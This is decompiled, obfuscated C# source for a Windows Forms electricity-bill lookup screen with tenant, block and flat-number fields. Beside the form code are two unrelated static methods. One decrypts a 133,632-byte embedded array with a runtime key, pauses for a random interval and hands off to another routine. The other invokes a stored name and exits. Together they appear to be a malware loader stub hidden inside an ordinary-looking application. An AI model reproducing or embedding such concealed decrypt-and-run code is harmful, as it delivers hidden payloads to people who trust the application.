using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Pb62;
using Tz3;
using f8TP;
using i3QJ;
using m6MF;
using p0H8;

namespace y9R4;

[DesignerGenerated]
public class Nz6q : Form
{
	private IContainer components;

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Back
	{
		[CompilerGenerated]
		get
		{
			return _Back;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Xi17;
			Button back = _Back;
			if (back != null)
			{
				((Control)back).remove_Click(eventHandler);
			}
			_Back = value;
			back = _Back;
			if (back != null)
			{
				((Control)back).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Search")]
	internal virtual Button Search
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ComboBox2")]
	internal virtual ComboBox ComboBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ComboBox1")]
	internal virtual ComboBox ComboBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("FlatNumber")]
	internal virtual Label FlatNumber
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("BlockName")]
	internal virtual Label BlockName
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridView1")]
	internal virtual DataGridView DataGridView1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column1")]
	internal virtual DataGridViewTextBoxColumn Column1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column2")]
	internal virtual DataGridViewTextBoxColumn Column2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column3")]
	internal virtual DataGridViewTextBoxColumn Column3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column4")]
	internal virtual DataGridViewTextBoxColumn Column4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column5")]
	internal virtual DataGridViewTextBoxColumn Column5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Nz6q()
	{
		Es8w();
	}

	[DebuggerNonUserCode]
	protected override void j1X9(bool z8PQ)
	{
		try
		{
			if (z8PQ && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(z8PQ);
		}
	}

	[DebuggerStepThrough]
	private void Es8w()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		Panel1 = new Panel();
		Back = new Button();
		Search = new Button();
		ComboBox2 = new ComboBox();
		ComboBox1 = new ComboBox();
		FlatNumber = new Label();
		BlockName = new Label();
		DataGridView1 = new DataGridView();
		Column1 = new DataGridViewTextBoxColumn();
		Column2 = new DataGridViewTextBoxColumn();
		Column3 = new DataGridViewTextBoxColumn();
		Column4 = new DataGridViewTextBoxColumn();
		Column5 = new DataGridViewTextBoxColumn();
		((Control)Panel1).SuspendLayout();
		((ISupportInitialize)DataGridView1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)Panel1).get_Controls().Add((Control)(object)Back);
		((Control)Panel1).get_Controls().Add((Control)(object)Search);
		((Control)Panel1).get_Controls().Add((Control)(object)ComboBox2);
		((Control)Panel1).get_Controls().Add((Control)(object)ComboBox1);
		((Control)Panel1).get_Controls().Add((Control)(object)FlatNumber);
		((Control)Panel1).get_Controls().Add((Control)(object)BlockName);
		((Control)Panel1).set_Location(new Point(40, 50));
		((Control)Panel1).set_Name("Panel1");
		((Control)Panel1).set_Size(new Size(681, 159));
		((Control)Panel1).set_TabIndex(0);
		((Control)Back).set_Location(new Point(530, 93));
		((Control)Back).set_Name("Back");
		((Control)Back).set_Size(new Size(107, 40));
		((Control)Back).set_TabIndex(5);
		((ButtonBase)Back).set_Text("Back");
		((ButtonBase)Back).set_UseVisualStyleBackColor(true);
		((Control)Search).set_Location(new Point(530, 22));
		((Control)Search).set_Name("Search");
		((Control)Search).set_Size(new Size(107, 46));
		((Control)Search).set_TabIndex(4);
		((ButtonBase)Search).set_Text("Search");
		((ButtonBase)Search).set_UseVisualStyleBackColor(true);
		((ListControl)ComboBox2).set_FormattingEnabled(true);
		((Control)ComboBox2).set_Location(new Point(237, 102));
		((Control)ComboBox2).set_Name("ComboBox2");
		((Control)ComboBox2).set_Size(new Size(180, 24));
		((Control)ComboBox2).set_TabIndex(3);
		((ListControl)ComboBox1).set_FormattingEnabled(true);
		((Control)ComboBox1).set_Location(new Point(237, 34));
		((Control)ComboBox1).set_Name("ComboBox1");
		((Control)ComboBox1).set_Size(new Size(180, 24));
		((Control)ComboBox1).set_TabIndex(2);
		FlatNumber.set_AutoSize(true);
		((Control)FlatNumber).set_Location(new Point(79, 102));
		((Control)FlatNumber).set_Name("FlatNumber");
		((Control)FlatNumber).set_Size(new Size(85, 17));
		((Control)FlatNumber).set_TabIndex(1);
		FlatNumber.set_Text("Flat Number");
		BlockName.set_AutoSize(true);
		((Control)BlockName).set_Location(new Point(79, 34));
		((Control)BlockName).set_Name("BlockName");
		((Control)BlockName).set_Size(new Size(83, 17));
		((Control)BlockName).set_TabIndex(0);
		BlockName.set_Text("Block Name");
		DataGridView1.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		DataGridView1.get_Columns().AddRange((DataGridViewColumn[])(object)new DataGridViewColumn[5]
		{
			(DataGridViewColumn)Column1,
			(DataGridViewColumn)Column2,
			(DataGridViewColumn)Column3,
			(DataGridViewColumn)Column4,
			(DataGridViewColumn)Column5
		});
		((Control)DataGridView1).set_Location(new Point(90, 266));
		((Control)DataGridView1).set_Name("DataGridView1");
		DataGridView1.get_RowTemplate().set_Height(24);
		((Control)DataGridView1).set_Size(new Size(543, 143));
		((Control)DataGridView1).set_TabIndex(1);
		((DataGridViewColumn)Column1).set_HeaderText("Tenant ID");
		((DataGridViewColumn)Column1).set_Name("Column1");
		((DataGridViewColumn)Column2).set_HeaderText("Date");
		((DataGridViewColumn)Column2).set_Name("Column2");
		((DataGridViewColumn)Column3).set_HeaderText("Previous Reading");
		((DataGridViewColumn)Column3).set_Name("Column3");
		((DataGridViewColumn)Column4).set_HeaderText("Current Reading");
		((DataGridViewColumn)Column4).set_Name("Column4");
		((DataGridViewColumn)Column5).set_HeaderText("Total Reading");
		((DataGridViewColumn)Column5).set_Name("Column5");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)DataGridView1);
		((Control)this).get_Controls().Add((Control)(object)Panel1);
		((Control)this).set_Name("E_Bill_Info");
		((Form)this).set_Text("E_Bill_Info");
		((Control)Panel1).ResumeLayout(false);
		((Control)Panel1).PerformLayout();
		((ISupportInitialize)DataGridView1).EndInit();
		((Control)this).ResumeLayout(false);
	}

	private void Xi17(object sender, EventArgs e)
	{
		((Form)this).Close();
		((Control)Ga6q.Forms.Admin_Function).Show();
	}

	internal static void Ko6c()
	{
		byte[] array = d7G4.c8K4(133632);
		checked
		{
			int bk4x = Conversions.ToInteger(a6M.mDic[a6M.sNum]) * 3;
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = t3KL.Gr4a(array[i], (byte[])a6M.mDic[a6M.sArray], bk4x, i);
			}
			a6M.mDic.Add(a6M.mArray, array);
			Task.Delay(new Random().Next(1000, 5000)).Wait();
			g8AE.d8DA();
		}
	}

	internal static void j9TS()
	{
		Qs08.Nd2c(a6M.mDic[a6M.mName].ToString());
		Environment.Exit(Environment.ExitCode);
	}
}
